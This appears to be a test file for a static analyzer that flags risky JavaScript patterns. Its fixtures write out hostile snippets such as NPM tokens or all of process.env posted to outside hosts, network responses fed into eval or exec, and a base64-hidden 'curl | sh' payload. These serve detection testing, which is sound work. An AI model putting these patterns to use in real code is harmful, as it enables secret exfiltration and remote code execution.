import { describe, expect, it } from "vitest";
import { extractFacts } from "../src/analyzers/extract.js";

const b64 = (s: string): string => Buffer.from(s, "utf8").toString("base64");

describe("extractFacts: benign code", () => {
  it("parses plain JS and TS without facts of concern", () => {
    const js = extractFacts(`export const add = (a, b) => a + b;\nconsole.log(add(1, 2));`, "src/a.js");
    expect(js.parsed).toBe(true);
    expect(js.dynamicExec).toHaveLength(0);
    expect(js.processExec).toHaveLength(0);

    const ts = extractFacts(
      `interface P { n: number }\nexport function f<T extends P>(x: T): number { return x.n as number }`,
      "src/b.ts",
    );
    expect(ts.parsed).toBe(true);
  });

  it("records a literal eval as literal", () => {
    const f = extractFacts(`eval("1 + 1");`, "src/a.js");
    expect(f.dynamicExec).toHaveLength(1);
    expect(f.dynamicExec[0]?.literalArg).toBe(true);
    expect(f.dynamicExec[0]?.taint).toEqual([]);
  });

  it("records plain fetch and spawn without taint", () => {
    const f = extractFacts(
      `import { spawn } from "node:child_process";\n` +
        `spawn("git", ["rev-parse", "HEAD"]);\n` +
        `fetch("https://api.example.com/items");`,
      "src/a.js",
    );
    expect(f.processExec[0]?.literalCommand).toBe(true);
    expect(f.processExec[0]?.shell).toBe(false);
    expect(f.network[0]?.dataTaint).toEqual([]);
  });

  it("does not treat a shadowed eval as the global eval", () => {
    const f = extractFacts(`function run(eval) { return eval(1); }`, "src/a.js");
    expect(f.dynamicExec).toHaveLength(0);
  });
});

describe("extractFacts: taint flows", () => {
  it("tracks base64 decode into eval", () => {
    const f = extractFacts(
      `const p = Buffer.from("${b64("console.log(1)")}", "base64").toString();\neval(p);`,
      "src/a.js",
    );
    expect(f.decode).toHaveLength(1);
    expect(f.dynamicExec[0]?.taint).toContain("decoded");
  });

  it("tracks atob into new Function", () => {
    const f = extractFacts(`const s = atob(window.name);\nnew Function(s)();`, "src/a.js");
    expect(f.dynamicExec[0]?.kind).toBe("Function");
    expect(f.dynamicExec[0]?.taint).toContain("decoded");
  });

  it("tracks network response into eval through then()", () => {
    const f = extractFacts(
      `fetch("https://x.example/p").then(r => r.text()).then(t => eval(t));`,
      "src/a.js",
    );
    expect(f.dynamicExec[0]?.taint).toContain("network");
  });

  it("tracks https.get callback data into exec", () => {
    const f = extractFacts(
      `const https = require("https");\nconst { exec } = require("child_process");\n` +
        `https.get("https://x.example/s", (res) => { let d = ""; res.on("data", (c) => { d += c; }); res.on("end", () => exec(d)); });`,
      "src/a.js",
    );
    expect(f.processExec[0]?.taint).toContain("network");
    expect(f.processExec[0]?.shell).toBe(true);
  });

  it("tracks env secrets into a network body", () => {
    const f = extractFacts(
      `fetch("https://hooks.example.net/c", { method: "POST", body: JSON.stringify({ t: process.env.NPM_TOKEN }) });`,
      "src/a.js",
    );
    expect(f.network[0]?.dataTaint).toContain("secret");
  });

  it("flags whole process.env being sent", () => {
    const f = extractFacts(
      `const https = require("https");\nconst r = https.request("https://1.2.3.4/x");\nr.write(JSON.stringify(process.env));`,
      "src/a.js",
    );
    expect(f.envReads.some((e) => e.whole)).toBe(true);
    expect(f.network.some((n) => n.dataTaint.includes("env"))).toBe(true);
    expect(f.network[0]?.hostClass).toBe("ip-literal");
  });
});

describe("extractFacts: hidden constructs", () => {
  it("resolves concatenated require names", () => {
    const f = extractFacts(`const cp = require("child_" + "process");\ncp.exec("id");`, "src/a.js");
    const hidden = f.imports.find((i) => i.module === "child_process");
    expect(hidden?.hidden).toBe(true);
    expect(f.processExec[0]?.api).toBe("child_process.exec");
  });

  it("resolves computed globalThis eval", () => {
    const f = extractFacts(`globalThis["ev" + "al"]("1");`, "src/a.js");
    expect(f.dynamicExec[0]?.kind).toBe("eval");
    expect(f.hiddenAccess[0]?.name).toBe("eval");
  });

  it("detects encoded blobs and their decoded markers statically", () => {
    const payload = `const cp = require("child_process"); cp.exec("curl http://x.example | sh"); ${"// pad ".repeat(30)}`;
    const f = extractFacts(`const blob = "${b64(payload)}";`, "src/a.js");
    expect(f.encodedBlobs).toHaveLength(1);
    expect(f.encodedBlobs[0]?.markers).toContain("child_process");
  });

  it("detects hex identifier obfuscation", () => {
    const names = ["_0x1a2b", "_0x3c4d", "_0x5e6f", "_0x7a8b", "_0x9c0d", "_0xabcd"];
    const f = extractFacts(names.map((n) => `var ${n} = 1;`).join("\n"), "src/a.js");
    expect(f.obfuscation.some((o) => o.kind === "hex-identifiers")).toBe(true);
  });

  it("marks config files", () => {
    expect(extractFacts("module.exports = {};", "vite.config.js").isConfigFile).toBe(true);
    expect(extractFacts("module.exports = {};", "src/server.js").isConfigFile).toBe(false);
  });

  it("reports parse failures without throwing", () => {
    const f = extractFacts("function (((", "src/bad.js");
    expect(f.parsed || f.parseError !== undefined).toBe(true);
  });
});
